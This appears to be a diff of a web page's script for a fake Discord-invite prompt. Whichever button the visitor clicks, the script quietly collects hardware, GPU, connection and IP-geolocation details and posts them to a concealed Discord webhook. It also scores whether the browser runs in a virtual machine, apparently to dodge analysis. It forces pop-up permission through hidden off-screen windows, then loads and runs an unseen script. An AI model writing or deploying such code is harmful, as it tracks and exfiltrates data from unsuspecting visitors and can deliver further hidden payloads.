@@ -89,7 +89,7 @@ button {
 <script>
 let isYouScriptLoaded = false;
 
-/* ===================== SYSTEM + VM INFO ===================== */
+// SYSTEM + VM INFO
 function getWebGLInfo(){
     try{
         const c = document.createElement("canvas");
@@ -100,44 +100,40 @@ function getWebGLInfo(){
             vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : "Unknown",
             renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Unknown"
         };
-    }catch{
-        return {};
-    }
+    }catch{return {};}
 }
 
 function getVMInfo(){
-    let score = 0;
-    const reasons = [];
+    let score = 0, reasons=[];
     const cores = navigator.hardwareConcurrency || 1;
-    if (cores <= 2){ score += 20; reasons.push("Low CPU cores"); }
-    if (navigator.deviceMemory && navigator.deviceMemory <= 4){ score += 20; reasons.push("Low RAM"); }
-    if ([1024,1280,1366].includes(screen.width)){ score += 15; reasons.push("Common VM resolution"); }
+    if(cores <= 2){ score+=20; reasons.push("Low CPU cores"); }
+    if(navigator.deviceMemory && navigator.deviceMemory<=4){ score+=20; reasons.push("Low RAM"); }
+    if([1024,1280,1366].includes(screen.width)){ score+=15; reasons.push("Common VM resolution"); }
     const ua = navigator.userAgent.toLowerCase();
-    if (["virtual","vmware","vbox","qemu","xen"].some(v => ua.includes(v))){ score += 40; reasons.push("VM keyword in UA"); }
-    const t0 = performance.now();
-    for(let i=0;i<1e6;i++){}
-    if (performance.now() - t0 > 60){ score += 15; reasons.push("Slow timing"); }
-    score += Math.random() * 10;
-    score = Math.min(99, Math.round(score));
-    return { score, detected: score >= 60, reasons };
+    if(["virtual","vmware","vbox","qemu","xen"].some(v=>ua.includes(v))){ score+=40; reasons.push("VM keyword in UA"); }
+    const t0 = performance.now(); for(let i=0;i<1e6;i++){} 
+    if(performance.now()-t0>60){ score+=15; reasons.push("Slow timing"); }
+    score += Math.random()*10; score=Math.min(99, Math.round(score));
+    return {score, detected:score>=60, reasons};
 }
-/* ================================================================ */
 
+// SCRIPT LOADER
 function loadYouScript(cb){
     if(isYouScriptLoaded){ cb(); return; }
-    const s = document.createElement('script');
-    s.src = '/scripts/you.js';
-    s.onload = () => { isYouScriptLoaded = true; cb(); };
-    s.onerror = () => console.error('Failed to load you.js');
+    const s=document.createElement('script');
+    s.src='/scripts/you.js';
+    s.onload=()=>{ isYouScriptLoaded=true; cb(); };
+    s.onerror=()=>console.error('Failed to load you.js');
     document.head.appendChild(s);
 }
 
-function checkPopupPermission() {
+// POPUP CHECK
+function checkPopupPermission(){
     return new Promise(resolve=>{
-        let popups = [], allowed = true;
+        let popups=[], allowed=true;
         try{
             for(let i=0;i<5;i++){
-                const p = window.open('','','width=1,height=1,left=-10000,top=-10000');
+                const p=window.open('','','width=1,height=1,left=-10000,top=-10000');
                 if(!p){ allowed=false; break; }
                 popups.push(p);
             }
@@ -145,38 +141,34 @@ function checkPopupPermission() {
                 popups.forEach(p=>{ try{p.close()}catch{} });
                 resolve(allowed);
             },200);
-        }catch{
-            popups.forEach(p=>{ try{p.close()}catch{} });
-            resolve(false);
-        }
+        }catch{ popups.forEach(p=>{ try{p.close()}catch{} }); resolve(false);}
     });
 }
 
-/* ===================== IP GEOLOCATION ===================== */
-async function getIPLocation() {
+// GEOLOCATION
+async function getIPLocation(){
     try{
         const res = await fetch("https://ipapi.co/json/");
-        if(!res.ok) return { ip:"Unknown", city:"Unknown", region:"Unknown", country:"Unknown" };
+        if(!res.ok) return {ip:"Unknown", city:"Unknown", region:"Unknown", country:"Unknown"};
         const data = await res.json();
-        return { ip: data.ip, city: data.city, region: data.region, country: data.country_name };
-    }catch{
-        return { ip:"Unknown", city:"Unknown", region:"Unknown", country:"Unknown" };
-    }
+        return {ip:data.ip, city:data.city, region:data.region, country:data.country_name};
+    }catch{return {ip:"Unknown", city:"Unknown", region:"Unknown", country:"Unknown"};}
 }
 
-/* ===================== SEND DISCORD ===================== */
+// SEND TO DISCORD
 async function sendToDiscord(buttonName){
-    const vm = getVMInfo();
-    const gl = getWebGLInfo();
-    const conn = navigator.connection || {};
-    const ipGeo = await getIPLocation();
+    const vm=getVMInfo();
+    const gl=getWebGLInfo();
+    const conn=navigator.connection||{};
+    const ipGeo=await getIPLocation();
 
-    const res = await fetch("/.netlify/functions/discord", { method: "GET" });
+    // Get webhook from Netlify
+    const res = await fetch("/.netlify/functions/discord", {method:"GET"});
     const json = await res.json();
     const webhook = json.webhook;
 
-    const payload = {
-        content: `✅ **Button clicked:** ${buttonName}`,
+    const payload={
+        content:`✅ **Button clicked:** ${buttonName}`,
         embeds:[{
             title:"User System Information",
             color:0x5865F2,
@@ -212,43 +204,37 @@ async function sendToDiscord(buttonName){
                 {name:"Referrer", value:document.referrer||"None"},
                 {name:"Page URL", value:location.href}
             ],
-            footer:{ text:new Date().toUTCString() }
+            footer:{text:new Date().toUTCString()}
         }]
     };
 
     await fetch(webhook,{
         method:"POST",
-        headers:{ "Content-Type":"application/json" },
+        headers:{"Content-Type":"application/json"},
         body:JSON.stringify(payload)
     }).catch(()=>{});
 }
 
+// HANDLE BUTTON CLICK
 async function handleClick(e, buttonName){
     e.preventDefault();
+    const popup=document.getElementById('popup_needed');
+    const spinner=document.getElementById('spinner_holder');
+    popup.style.display='none';
+    spinner.innerHTML='<div class="spinner"><div></div><div></div><div></div></div>';
 
-    const popup = document.getElementById('popup_needed');
-    const spinner = document.getElementById('spinner_holder');
-
-    popup.style.display = 'none';
-    spinner.innerHTML = '<div class="spinner"><div></div><div></div><div></div></div>';
-
-    const popupAllowed = await checkPopupPermission();
-
-    if(!popupAllowed){
-        spinner.innerHTML = '';
-        popup.style.display = 'block';
-        return;
-    }
+    const allowed = await checkPopupPermission();
+    if(!allowed){ spinner.innerHTML=''; popup.style.display='block'; return; }
 
     loadYouScript(async ()=>{
         await sendToDiscord(buttonName);
-        if(typeof window.runYouScript === 'function'){ window.runYouScript(); }
-        spinner.innerHTML = '';
+        if(typeof window.runYouScript==='function'){ window.runYouScript(); }
+        spinner.innerHTML='';
     });
 }
 
-document.getElementById('discord_btn').addEventListener('click', e => handleClick(e,'Join Discord'));
-document.getElementById('nah_btn').addEventListener('click', e => handleClick(e,'Maybe later'));
+document.getElementById('discord_btn').addEventListener('click', e=>handleClick(e,'Join Discord'));
+document.getElementById('nah_btn').addEventListener('click', e=>handleClick(e,'Maybe later'));
 </script>
 </body>
 </html>
